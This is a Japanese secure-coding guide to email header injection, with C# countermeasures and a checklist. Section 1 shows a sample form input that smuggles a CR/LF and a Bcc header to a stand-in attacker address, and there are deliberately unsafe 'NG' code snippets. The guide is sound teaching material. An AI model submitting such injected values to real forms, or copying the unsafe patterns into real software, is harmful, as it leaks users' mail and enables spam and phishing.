# メールヘッダ・インジェクション

---

## 1. メールヘッダ・インジェクションとは

ウェブアプリケーションのメール送信機能において、ユーザーの入力値をメールヘッダに含める際に改行文字を混入させ、**任意のヘッダを追加したり本文を改ざんしたりする**攻撃。

```
攻撃例：「お名前」フィールドに以下を入力される
田中\r\nBcc: attacker@evil.com

↓ 生成されるメールヘッダ（改行が挿入される）
From: noreply@example.com
To: victim@example.com
Subject: お問い合わせ
X-Name: 田中
Bcc: attacker@evil.com   ← 攻撃者が挿入した行

→ 攻撃者のアドレスに全メールのコピーが送信される
```

---

## 2. 発生しうる脅威

- **スパムメールの送信**：攻撃者が用意した宛先へ大量メールを送信（踏み台）
- **個人情報の漏えい**：Bcc に攻撃者を追加して他ユーザーの情報を盗む
- **フィッシングメールの送信**：正規サイトのドメインを使って偽メールを送信
- **メール本文の改ざん**：Subject や Body を書き換えた不正メールの送信

---

## 3. 注意が必要なウェブサイトの特徴

| 機能 | 例 |
| --- | --- |
| お問い合わせフォーム | 入力内容をメールで送信するサイト |
| 会員登録・パスワードリセット | 登録情報をメールに含めて送信するサイト |
| 注文確認メール | 購入者の入力値をメール本文に含めるサイト |

---

## 4. 対策1：メール送信ライブラリを使用する（根本的対策）

自前でヘッダを組み立てず、**実績のあるメール送信ライブラリ**を使う。適切なライブラリは改行文字を自動的に処理する。

```csharp
// ✅ OK：.NET の MailMessage + SmtpClient を使う
using System.Net.Mail;

var mail = new MailMessage();
mail.From    = new MailAddress("noreply@example.com");
mail.To.Add("user@example.com");
mail.Subject = userSubject;   // ライブラリが改行を処理する
mail.Body    = userBody;

using var smtp = new SmtpClient("smtp.example.com");
await smtp.SendMailAsync(mail);
```

---

## 5. 対策2：入力値の改行文字を除去・拒否する

ヘッダに使用する値（To・Subject・From・名前など）から改行文字を除去する。

```csharp
// ❌ NG：入力値をそのままヘッダに使う
mail.Subject = Request.Form["subject"];

// ✅ OK：改行文字（\r・\n）を除去してからセットする
string SanitizeHeader(string input)
{
    return input
        .Replace("\r\n", " ")
        .Replace("\r",   " ")
        .Replace("\n",   " ");
}

mail.Subject = SanitizeHeader(Request.Form["subject"]);
```

---

## 6. 対策3：ヘッダに使用する値をホワイトリストで検証する

宛先・差出人など固定できる値は、**ユーザー入力を直接使わず**サーバー側で決定する。

```csharp
// ❌ NG：ユーザー入力のメールアドレスをそのまま To に使う
mail.To.Add(Request.Form["email"]);

// ✅ OK：入力値のバリデーション後に使用する
string email = Request.Form["email"];

// メールアドレスの形式チェック
if (!System.Net.Mail.MailAddress.TryCreate(email, out var address))
{
    return BadRequest("メールアドレスの形式が正しくありません。");
}

mail.To.Add(address);
```

---

## 7. 対策4：HTML メールで特殊文字をエスケープする

メール本文に HTML を使用する場合は、XSS と同様にエスケープ処理を行う。

```csharp
// ✅ OK：HTML エンコードしてから本文に埋め込む
mail.IsBodyHtml = true;
mail.Body = $"<p>お名前：{System.Web.HttpUtility.HtmlEncode(userName)}</p>";
```

---

## 8. まとめ：メールヘッダ・インジェクション対策チェックリスト

| 対策 | 内容 |
| --- | --- |
| ライブラリを使う | 実績のあるメール送信ライブラリで自動処理させる |
| 改行文字を除去 | ヘッダに使う入力値から `\r`・`\n` を除去する |
| バリデーション | メールアドレス形式のチェックを行う |
| 固定値はサーバーで決定 | 差出人・宛先はなるべくユーザー入力に依存しない |
| HTML メールはエスケープ | 本文に入力値を含める場合は HTML エンコードする |
